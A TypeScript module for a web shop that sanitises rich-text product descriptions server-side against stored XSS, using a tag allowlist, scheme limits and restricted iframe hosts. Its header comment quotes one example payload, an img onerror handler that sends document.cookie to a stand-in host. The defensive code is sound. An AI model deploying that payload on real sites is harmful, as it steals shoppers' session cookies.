/**
 * Rich text, made safe to render (§16.3).
 *
 * ── Why this is server-side ──────────────────────────────────────────────────
 *
 * A product description is written in a browser and rendered in every other
 * browser that visits the shop. That makes it the classic stored-XSS vector:
 * `<img src=x onerror="fetch('https://evil/'+document.cookie)">` saved once,
 * executed for every shopper, on every page that shows the description — the
 * checkout page included.
 *
 * The editor sanitises nothing that matters. It is a browser, and the browser
 * is the attacker's. `PATCH /admin/products/:id` accepts JSON from anything
 * holding `catalog:write` — a script, an import, a compromised staff token —
 * and none of those load the editor at all. So the allowlist runs here, on
 * write, where it cannot be skipped.
 *
 * ── Why an allowlist, not an escape ──────────────────────────────────────────
 *
 * Escaping would store `&lt;p&gt;` and render visible tags. Stripping keeps the
 * text and drops the markup, which is what somebody pasting from Word actually
 * wants. The list below is exactly what the admin's editor can produce; a tag
 * that is not in it is not a tag this shop has any use for.
 *
 * ── The link rule ────────────────────────────────────────────────────────────
 *
 * `javascript:` in an `href` is script execution on click, and it survives most
 * naive tag filters. Only http, https, mailto and tel are permitted, which is
 * the same restriction `common.ts` already applies to plain URL fields.
 */
import sanitizeHtml from 'sanitize-html'

/**
 * What the editor can produce, and nothing else.
 *
 * Kept deliberately narrow. `style` is absent from every element: an attacker
 * with arbitrary CSS can position an invisible overlay across the page and
 * harvest clicks, and no product description needs it. Colour comes through
 * the classes below instead.
 */
const ALLOWED: sanitizeHtml.IOptions = {
  allowedTags: [
    'p', 'br', 'hr',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'strong', 'b', 'em', 'i', 'u', 's', 'strike', 'code', 'pre',
    'ul', 'ol', 'li',
    'blockquote',
    'a',
    'img',
    'table', 'thead', 'tbody', 'tr', 'th', 'td',
    'iframe',
    'span', 'div',
  ],

  allowedAttributes: {
    a: ['href', 'title', 'target', 'rel'],
    img: ['src', 'alt', 'title', 'width', 'height', 'loading'],
    // Alignment is stored as a class rather than inline CSS, so no element in
    // this document can carry arbitrary style.
    '*': ['class'],
    th: ['colspan', 'rowspan', 'scope'],
    td: ['colspan', 'rowspan'],
    // Video embeds. `src` is separately restricted to known hosts below.
    iframe: ['src', 'width', 'height', 'allowfullscreen', 'frameborder', 'allow', 'title'],
  },

  // Anything else is script execution one way or another.
  allowedSchemes: ['http', 'https', 'mailto', 'tel'],
  // Images may be data URIs — the editor never produces one, but a paste can,
  // and a base64 image is inert.
  allowedSchemesByTag: { img: ['http', 'https', 'data'] },
  allowProtocolRelative: false,

  /**
   * Only real video hosts may be framed.
   *
   * An unrestricted `<iframe>` is a page inside your page: it can cover the
   * checkout form with a copy of itself. This is the difference between "we
   * support video embeds" and "we let staff mount anything on the storefront".
   */
  allowedIframeHostnames: [
    'www.youtube.com',
    'youtube.com',
    'www.youtube-nocookie.com',
    'player.vimeo.com',
  ],
  allowIframeRelativeUrls: false,

  transformTags: {
    /**
     * Every link leaving the shop is untrusted.
     *
     * `target="_blank"` without `rel="noopener"` hands the opened page a live
     * `window.opener` reference to yours, and it can navigate your tab to a
     * copy of your own login screen. Added unconditionally rather than trusting
     * whatever the editor emitted.
     */
    a: (tagName, attribs) => ({
      tagName,
      attribs: {
        ...attribs,
        ...(attribs.target === '_blank' ? { rel: 'noopener noreferrer nofollow' } : {}),
      },
    }),
  },

  // Empty paragraphs are how somebody makes a gap; do not collapse them.
  nonTextTags: ['script', 'style', 'textarea', 'option', 'noscript'],

  /**
   * Drops embeds whose source did not survive.
   *
   * A rejected iframe host leaves `<iframe></iframe>` behind — the attribute is
   * stripped, the element is not. That is invisible junk in every document
   * somebody pasted a bad embed into, and it makes "does this have media in it"
   * answer yes for a document containing nothing.
   */
  exclusiveFilter: (frame) =>
    (frame.tag === 'iframe' || frame.tag === 'img') && !frame.attribs.src,
}

/**
 * Cleans a rich-text field. `null` and empty stay as they are.
 *
 * A document that sanitises down to nothing but whitespace becomes `null`
 * rather than an empty `<p></p>`, so "has a description" stays a question the
 * database can answer.
 */
export function sanitiseRichText(value: string | null | undefined): string | null | undefined {
  if (value === null || value === undefined) return value
  const clean = sanitizeHtml(value, ALLOWED).trim()
  // `<p></p>` and `<p><br /></p>` are what an emptied editor leaves behind.
  const hasContent = clean.replace(/<[^>]*>/g, '').replace(/&nbsp;/g, ' ').trim().length > 0
  const hasMedia = /<(img|iframe|hr|table)\b/i.test(clean)
  return hasContent || hasMedia ? clean : null
}

/**
 * A zod transform, so a field is sanitised by declaring it rather than by
 * remembering to call something in the route.
 *
 * Used as `richText(20_000)` in a validator. The length cap applies to the
 * *incoming* value: markup is part of what a client may send, and a document
 * that is 90% attribute soup is one this shop does not have to store.
 */
export function richTextField(maxLength: number) {
  return {
    maxLength,
    sanitise: sanitiseRichText,
  }
}

/** Plain text from rich text, for previews, search and meta descriptions. */
export function richTextToPlain(value: string | null | undefined): string {
  if (!value) return ''
  // A space at every block boundary first. Stripping tags naively turns
  // `<h2>Balm</h2><p>Rich</p>` into "BalmRich", and that is what ends up in a
  // meta description and a search index.
  const spaced = value.replace(/<\/(p|div|h[1-6]|li|tr|blockquote|pre)>/gi, ' ')
    .replace(/<br\s*\/?>/gi, ' ')
  return sanitizeHtml(spaced, { allowedTags: [], allowedAttributes: {} })
    .replace(/\s+/g, ' ')
    .trim()
}
